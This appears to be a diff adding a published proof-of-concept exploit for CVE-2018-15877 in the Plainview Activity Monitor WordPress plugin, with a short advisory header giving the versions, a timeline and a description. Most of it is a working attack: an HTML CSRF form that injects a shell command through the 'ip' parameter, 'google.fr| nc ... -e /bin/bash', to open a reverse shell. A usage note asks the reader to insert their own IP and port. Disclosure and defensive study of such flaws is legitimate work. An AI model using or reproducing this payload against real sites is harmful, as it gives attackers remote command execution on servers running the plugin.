@@ -1,0 +1,56 @@
+<!--
+About:
+===========
+Component: Plainview Activity Monitor (Wordpress plugin)
+Vulnerable version: 20161228 and possibly prior
+Fixed version: 20180826
+CVE-ID: CVE-2018-15877
+CWE-ID: CWE-78
+Author:
+- LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)
+
+Timeline:
+===========
+- 2018/08/25: Vulnerability found
+- 2018/08/25: CVE-ID request
+- 2018/08/26: Reported to developer
+- 2018/08/26: Fixed version
+- 2018/08/26: Advisory published on GitHub
+- 2018/08/26: Advisory sent to bugtraq mailing list
+
+Description:
+===========
+Plainview Activity Monitor Wordpress plugin is vulnerable to OS
+command injection which allows an attacker to remotely execute
+commands on underlying system. Application passes unsafe user supplied
+data to ip parameter into activities_overview.php.
+Privileges are required in order to exploit this vulnerability, but
+this plugin version is also vulnerable to CSRF attack and Reflected
+XSS. Combined, these three vulnerabilities can lead to Remote Command
+Execution just with an admin click on a malicious link.
+
+References:
+===========
+https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/
+
+PoC:
+-->
+
+<html>
+  <!--  Wordpress Plainview Activity Monitor RCE
+        [+] Version: 20161228 and possibly prior
+        [+] Description: Combine OS Commanding and CSRF to get reverse shell
+        [+] Author: LydA(c)ric LEFEBVRE
+        [+] CVE-ID: CVE-2018-15877
+        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
+        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
+  -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
+      <input type="hidden" name="lookup" value="Lookup" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
